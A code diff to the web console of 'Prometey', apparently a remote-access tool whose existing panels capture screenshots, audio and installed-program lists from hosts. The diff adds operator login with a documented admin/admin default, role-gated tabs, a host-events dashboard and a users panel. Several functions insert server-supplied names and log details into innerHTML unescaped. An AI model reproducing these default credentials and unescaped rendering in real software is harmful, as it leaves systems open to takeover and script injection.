@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<meta name="build" content="1.0.192" />
+<meta name="build" content="1.0.193" />
 <title>Prometey</title>
 <style>
 /* ═══════════════════════════════════════════════════
@@ -1009,6 +1009,8 @@ body {
     <button class="nav-btn" data-panel="screenshots" data-i18n-title="nav_screenshots" title="Screenshots">📷</button>
     <button class="nav-btn" data-panel="audio" data-i18n-title="nav_audio" title="Audio Recording">🎙️</button>
     <button class="nav-btn" data-panel="programs" data-i18n-title="nav_programs" title="Installed Programs">📦</button>
+    <button class="nav-btn" data-panel="host_events" title="Host Events Dashboard">📈</button>
+    <button class="nav-btn" data-panel="users" title="Users (admin only)">👤</button>
     <button class="nav-btn" data-panel="settings" data-i18n-title="nav_settings" title="Settings">⚙️</button>
   </div>
 
@@ -1688,6 +1690,36 @@ body {
       </div>
     </div>
 
+    <!-- Host Events Dashboard panel (available to any logged-in operator,
+         they see events of their own room). Admin can additionally pull
+         aggregated stats across all tokens via /admin WebSocket. -->
+    <div id="panel-host_events" class="panel" style="flex-direction:column;">
+      <div class="panel-header">
+        <span class="panel-title">Host Events Dashboard</span>
+        <div style="margin-left:auto;">
+          <button id="he-refresh" class="btn-secondary" style="padding:4px 10px;font-size:12px;">Refresh</button>
+        </div>
+      </div>
+      <div style="flex:1; overflow-y:auto; padding:12px;" id="he-body">
+        <div style="color:var(--muted);">Loading…</div>
+      </div>
+    </div>
+
+    <!-- Users panel: admin-only CRUD. Non-admin operators see a minimal
+         "your profile" view listing their allowed tabs, nothing else. -->
+    <div id="panel-users" class="panel" style="flex-direction:column;">
+      <div class="panel-header">
+        <span class="panel-title">Users</span>
+        <div style="margin-left:auto;">
+          <button id="usr-refresh" class="btn-secondary" style="padding:4px 10px;font-size:12px;">Refresh</button>
+          <button id="usr-create-btn" class="btn-primary" style="padding:4px 10px;font-size:12px;margin-left:6px;">+ New user</button>
+        </div>
+      </div>
+      <div style="flex:1; overflow-y:auto; padding:12px;" id="usr-body">
+        <div style="color:var(--muted);">Loading…</div>
+      </div>
+    </div>
+
     <div id="panel-settings" class="panel" style="flex-direction:column;">
       <div class="panel-header">
         <span class="panel-title" data-i18n="title_settings">Settings</span>
@@ -2057,6 +2089,25 @@ body {
       <input type="checkbox" id="in-ssl" />
       <label for="in-ssl" style="font-size:12px;color:var(--muted);">Use WSS (SSL)</label>
     </div>
+
+    <!-- Operator login: separate from the room-token/password above (that
+         pairs the viewer with the host via the VPS). These credentials
+         identify an individual operator, gate tab access by role, and
+         populate the admin activity log. Default bootstrap: admin/admin. -->
+    <div style="border-top:1px solid var(--bd);margin:14px 0;padding-top:12px;">
+      <div class="form-label" style="margin-bottom:8px;font-weight:600;color:var(--accent);">Operator login</div>
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label">Username</label>
+          <input class="form-input" id="in-user" placeholder="admin" autocomplete="username" />
+        </div>
+        <div class="form-group">
+          <label class="form-label">User password</label>
+          <input class="form-input" id="in-user-pass" type="password" placeholder="admin" autocomplete="current-password" />
+        </div>
+      </div>
+    </div>
+
     <button type="button" class="btn-primary" id="btn-modal-connect">⚡ CONNECT</button>
     <div id="modal-error" style="color:var(--danger);font-size:12px;margin-top:10px;min-height:16px;"></div>
   </div>
@@ -3171,6 +3222,35 @@ function handleText(raw) {
       localStorage.setItem('rdp_password', document.getElementById('in-pass').value);
     } catch (e) {}
     setConnStatus('online');
+    // Operator login step: after the relay auth succeeded, send user_login
+    // with the operator's username/password (collected in the modal). The
+    // server returns role + allowed_tabs + a session token; we persist the
+    // token in memory (state.session) and apply tab visibility from the
+    // allowed_tabs list. Admins get all tabs; operators get a subset.
+    try {
+      const uname = document.getElementById('in-user').value.trim();
+      const upass = document.getElementById('in-user-pass').value;
+      if (uname && upass) {
+        sendCmd({cmd:'user_login', username: uname, password: upass})
+          .then(r => {
+            if (!r || !r.ok) {
+              addLog('Operator login failed: ' + (r && r.error || 'no response'), 'WARN');
+              notify('Operator login failed — see log', 'warn');
+              return;
+            }
+            state.session      = r.data.session;
+            state.username     = r.data.username;
+            state.userRole     = r.data.role;
+            state.allowedTabs  = r.data.allowed_tabs || [];
+            state.allTabs      = r.data.all_tabs || [];
+            try { localStorage.setItem('rdp_user', uname); } catch (e) {}
+            applyTabVisibility();
+            addLog('Logged in as ' + state.username + ' (' + state.userRole + ')', 'OK');
+          })
+          .catch(e => addLog('Login error: ' + e.message, 'WARN'));
+      }
+    } catch(e) {}
+
     document.getElementById('modal-overlay').classList.add('hidden');
     document.getElementById('btn-connect').classList.add('hidden');
     document.getElementById('btn-disconnect').classList.remove('hidden');
@@ -10549,6 +10629,260 @@ function progExport() {
   if (sel) sel.value = CUR_LANG;
   document.documentElement.lang = CUR_LANG;
   applyLanguage();
+})();
+
+// ═══════════════════════════════════════════════════════════════════════
+//   User / role / permission layer
+//   See server.py user_login / user_list / user_create / user_update /
+//   user_delete / user_activity / host_events_stats commands.
+// ═══════════════════════════════════════════════════════════════════════
+
+function applyTabVisibility() {
+  // Server returns allowed_tabs as a list of panel names. Hide any nav-btn
+  // whose data-panel isn't in that list. Nav-panels not listed in ALL_TABS
+  // (older panels this script doesn't know about) stay visible for admins.
+  const allowed = new Set(state.allowedTabs || []);
+  // host_events + users live in ALL_TABS; admin gets them automatically.
+  // For operators, they appear only if explicitly listed in allowed_tabs.
+  document.querySelectorAll('.nav-btn[data-panel]').forEach(btn => {
+    const panel = btn.getAttribute('data-panel');
+    // 'screen' is always visible (it's the home surface — can't hide it).
+    // 'dashboard' too — always grant the overview.
+    if (panel === 'screen' || panel === 'dashboard') return;
+    // Users tab is admin-only regardless of allowed_tabs.
+    if (panel === 'users') {
+      btn.style.display = (state.userRole === 'admin') ? '' : 'none';
+      return;
+    }
+    btn.style.display = allowed.has(panel) ? '' : 'none';
+  });
+  // If the currently-open panel got hidden, switch to dashboard.
+  const activeBtn = document.querySelector('.nav-btn.active');
+  if (activeBtn && activeBtn.style.display === 'none') {
+    const home = document.querySelector('.nav-btn[data-panel="dashboard"]');
+    if (home) home.click();
+  }
+}
+
+// ── Host Events Dashboard (embedded) ──
+function heRender(data) {
+  const body = document.getElementById('he-body');
+  if (!body) return;
+  if (!data) { body.innerHTML = '<div style="color:var(--danger);">No data</div>'; return; }
+  const tot = data.totals || {};
+  const toks = data.tokens || {};
+  const names = Object.keys(toks).sort();
+
+  const fmtDur = (s) => {
+    s = Math.max(0, Math.floor(s || 0));
+    const d = Math.floor(s / 86400);
+    const h = Math.floor((s % 86400) / 3600);
+    const m = Math.floor((s % 3600) / 60);
+    const r = s % 60;
+    if (d) return d + 'd ' + h + 'h ' + m + 'm';
+    if (h) return h + 'h ' + m + 'm';
+    if (m) return m + 'm ' + r + 's';
+    return r + 's';
+  };
+  const fmtTs = (t) => t ? new Date(t * 1000).toLocaleString() : '—';
+
+  let html = '<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin-bottom:16px;">';
+  const kpi = (label, val, color) => `<div style="background:var(--panel-bg);border:1px solid var(--bd);padding:10px 12px;border-radius:4px;"><div style="color:var(--muted);font-size:11px;text-transform:uppercase;">${label}</div><div style="font-size:22px;font-weight:600;${color?'color:'+color+';':''}">${val}</div></div>`;
+  html += kpi('Hosts tracked', tot.hosts || 0);
+  html += kpi('Online now',    tot.online || 0, 'var(--success)');
+  html += kpi('Sleeping',      tot.sleeping || 0, 'var(--warning)');
+  html += kpi('Offline',       tot.offline || 0, 'var(--danger)');
+  html += '</div>';
+
+  html += '<table style="width:100%;border-collapse:collapse;background:var(--panel-bg);border:1px solid var(--bd);font-size:12px;">';
+  html += '<thead><tr style="background:var(--bg-dark);">';
+  for (const h of ['Token','State','Uptime','Sleep','Locked','Starts','Sleeps','Locks','Last event','Last seen']) {
+    html += '<th style="padding:6px 8px;text-align:left;color:var(--muted);font-size:10px;text-transform:uppercase;">' + h + '</th>';
+  }
+  html += '</tr></thead><tbody>';
+  if (!names.length) {
+    html += '<tr><td colspan="10" style="padding:12px;color:var(--muted);">No events logged yet.</td></tr>';
+  }
+  for (const tok of names) {
+    const t = toks[tok];
+    const stColor = t.state === 'online' ? 'var(--success)' :
+                    t.state === 'sleeping' ? 'var(--warning)' : 'var(--danger)';
+    html += '<tr style="border-top:1px solid var(--bd);">';
+    html += '<td style="padding:6px 8px;font-family:monospace;">' + tok + '</td>';
+    html += '<td style="padding:6px 8px;"><span style="padding:2px 6px;border-radius:3px;background:rgba(88,166,255,.14);color:' + stColor + ';font-weight:600;text-transform:uppercase;font-size:10px;">' + t.state + (t.locked?'+lock':'') + '</span></td>';
+    html += '<td style="padding:6px 8px;">' + fmtDur(t.uptime_seconds) + '</td>';
+    html += '<td style="padding:6px 8px;">' + fmtDur(t.sleep_seconds) + '</td>';
+    html += '<td style="padding:6px 8px;">' + fmtDur(t.locked_seconds) + '</td>';
+    html += '<td style="padding:6px 8px;">' + (t.startups || 0) + '</td>';
+    html += '<td style="padding:6px 8px;">' + (t.sleeps || 0) + '</td>';
+    html += '<td style="padding:6px 8px;">' + (t.locks || 0) + '</td>';
+    html += '<td style="padding:6px 8px;color:var(--muted);">' + (t.last_event || '—') + '</td>';
+    html += '<td style="padding:6px 8px;color:var(--muted);">' + fmtTs(t.last_seen) + '</td>';
+    html += '</tr>';
+  }
+  html += '</tbody></table>';
+  body.innerHTML = html;
+}
+
+async function heRefresh() {
+  if (!state.session) return;
+  // Only admins can get cross-token stats; operators see their own room.
+  // Server enforces the admin-only check for host_events_stats.
+  try {
+    const r = await sendCmd({cmd:'host_events_stats', session: state.session});
+    if (r && r.ok) heRender(r.data);
+    else document.getElementById('he-body').innerHTML =
+      '<div style="color:var(--danger);">' + (r && r.error || 'Failed') + '</div>';
+  } catch(e) {
+    document.getElementById('he-body').innerHTML =
+      '<div style="color:var(--danger);">' + e.message + '</div>';
+  }
+}
+
+// ── Users CRUD ──
+function usrRender(data) {
+  const body = document.getElementById('usr-body');
+  if (!body) return;
+  const users = (data && data.users) || [];
+  const allTabs = (data && data.all_tabs) || state.allTabs || [];
+  let html = '<table style="width:100%;border-collapse:collapse;background:var(--panel-bg);border:1px solid var(--bd);font-size:12px;">';
+  html += '<thead><tr style="background:var(--bg-dark);">';
+  for (const h of ['Username','Role','Allowed tabs','Created','Last login','Actions']) {
+    html += '<th style="padding:6px 8px;text-align:left;color:var(--muted);font-size:10px;text-transform:uppercase;">' + h + '</th>';
+  }
+  html += '</tr></thead><tbody>';
+  for (const u of users) {
+    html += '<tr style="border-top:1px solid var(--bd);">';
+    html += '<td style="padding:6px 8px;font-weight:600;">' + u.username + '</td>';
+    html += '<td style="padding:6px 8px;">' + u.role + '</td>';
+    html += '<td style="padding:6px 8px;color:var(--muted);font-size:11px;">' + (u.allowed_tabs || []).join(', ') + '</td>';
+    html += '<td style="padding:6px 8px;color:var(--muted);font-size:11px;">' + (u.created_at || '—') + '</td>';
+    html += '<td style="padding:6px 8px;color:var(--muted);font-size:11px;">' + (u.last_login || 'never') + '</td>';
+    html += '<td style="padding:6px 8px;">';
+    html += `<button class="btn-secondary usr-edit" data-u="${u.username}" style="padding:2px 8px;font-size:11px;">Edit</button> `;
+    if (u.username !== state.username) {
+      html += `<button class="btn-secondary usr-del" data-u="${u.username}" style="padding:2px 8px;font-size:11px;color:var(--danger);">Delete</button>`;
+    }
+    html += '</td></tr>';
+  }
+  html += '</tbody></table>';
+
+  // Activity log section — only for admin.
+  if (state.userRole === 'admin') {
+    html += '<div style="margin-top:20px;"><div style="color:var(--muted);font-size:11px;text-transform:uppercase;margin-bottom:6px;">Operator activity (last 200)</div>';
+    html += '<div id="usr-activity" style="font-family:monospace;font-size:11px;background:var(--panel-bg);border:1px solid var(--bd);padding:8px;max-height:300px;overflow-y:auto;">Loading…</div></div>';
+  }
+
+  body.innerHTML = html;
+
+  // Wire up row buttons
+  body.querySelectorAll('.usr-edit').forEach(b => b.onclick = () => {
+    const uname = b.getAttribute('data-u');
+    const u = users.find(x => x.username === uname);
+    usrEditDialog(u, allTabs);
+  });
+  body.querySelectorAll('.usr-del').forEach(b => b.onclick = async () => {
+    const uname = b.getAttribute('data-u');
+    if (!confirm('Delete user "' + uname + '"?')) return;
+    const r = await sendCmd({cmd:'user_delete', session: state.session, username: uname});
+    if (r && r.ok) { notify('Deleted ' + uname, 'success'); usrRefresh(); }
+    else notify('Delete failed: ' + (r && r.error || '?'), 'warn');
+  });
+
+  if (state.userRole === 'admin') {
+    usrLoadActivity();
+  }
+}
+
+async function usrLoadActivity() {
+  try {
+    const r = await sendCmd({cmd:'user_activity', session: state.session, limit: 200});
+    const el = document.getElementById('usr-activity');
+    if (!el) return;
+    if (!r || !r.ok) { el.textContent = (r && r.error) || 'Failed'; return; }
+    const entries = (r.data && r.data.entries) || [];
+    if (!entries.length) { el.textContent = '(no activity logged yet)'; return; }
+    el.innerHTML = entries.reverse().map(e =>
+      '<div>' + e.ts + '  <b>' + e.user + '</b> <span style="color:var(--muted);">(' + e.role + ')</span> ' + e.action +
+      (e.detail ? '  <span style="color:var(--muted);">' + e.detail + '</span>' : '') + '</div>'
+    ).join('');
+  } catch(e) {}
+}
+
+function usrEditDialog(user, allTabs) {
+  const isNew = !user;
+  const cur = user || { username:'', role:'operator', allowed_tabs: [] };
+  const name = isNew ? prompt('Username:') : cur.username;
+  if (!name) return;
+  const pwd  = prompt(isNew ? 'Password:' : 'New password (blank = keep current):', '');
+  if (isNew && !pwd) return;
+  const role = prompt('Role (admin|operator):', cur.role) || cur.role;
+  const tabsStr = prompt('Allowed tabs (comma-separated, blank=role default).\nAvailable: ' + allTabs.join(', '),
+                         (cur.allowed_tabs || []).join(','));
+  const tabs = tabsStr == null ? null : tabsStr.split(',').map(s=>s.trim()).filter(Boolean);
+
+  const doCall = async () => {
+    let r;
+    if (isNew) {
+      r = await sendCmd({cmd:'user_create', session: state.session,
+        user: { username:name, password:pwd, role, allowed_tabs:tabs }});
+    } else {
+      const updates = {};
+      if (pwd) updates.password = pwd;
+      if (role !== cur.role) updates.role = role;
+      if (tabs !== null) updates.allowed_tabs = tabs;
+      r = await sendCmd({cmd:'user_update', session: state.session,
+        username: name, updates});
+    }
+    if (r && r.ok) { notify(isNew?'Created':'Updated', 'success'); usrRefresh(); }
+    else notify('Failed: ' + (r && r.error || '?'), 'warn');
+  };
+  doCall();
+}
+
+async function usrRefresh() {
+  if (state.userRole !== 'admin') {
+    document.getElementById('usr-body').innerHTML =
+      '<div style="color:var(--muted);padding:16px;">' +
+      'You are logged in as <b>' + state.username + '</b> (' + state.userRole + ').<br>' +
+      'Allowed tabs: ' + (state.allowedTabs || []).join(', ') + '<br><br>' +
+      'Only administrators can manage users.</div>';
+    return;
+  }
+  try {
+    const r = await sendCmd({cmd:'user_list', session: state.session});
+    if (r && r.ok) usrRender(r.data);
+    else document.getElementById('usr-body').innerHTML =
+      '<div style="color:var(--danger);">' + (r && r.error || '?') + '</div>';
+  } catch(e) {
+    document.getElementById('usr-body').innerHTML =
+      '<div style="color:var(--danger);">' + e.message + '</div>';
+  }
+}
+
+// Wire panel-open hooks. Refresh when user navigates to the panel.
+(function wireHostEventsAndUsers() {
+  document.querySelectorAll('.nav-btn[data-panel="host_events"]').forEach(b =>
+    b.addEventListener('click', () => setTimeout(heRefresh, 50)));
+  document.querySelectorAll('.nav-btn[data-panel="users"]').forEach(b =>
+    b.addEventListener('click', () => setTimeout(usrRefresh, 50)));
+  const he = document.getElementById('he-refresh');
+  if (he) he.onclick = heRefresh;
+  const ur = document.getElementById('usr-refresh');
+  if (ur) ur.onclick = usrRefresh;
+  const uc = document.getElementById('usr-create-btn');
+  if (uc) uc.onclick = () => usrEditDialog(null, state.allTabs || []);
+})();
+
+// Pre-fill username field from localStorage if available.
+(function fillUserField() {
+  try {
+    const saved = localStorage.getItem('rdp_user');
+    if (saved) {
+      const el = document.getElementById('in-user');
+      if (el) el.value = saved;
+    }
+  } catch(e) {}
 })();
 
 </script>
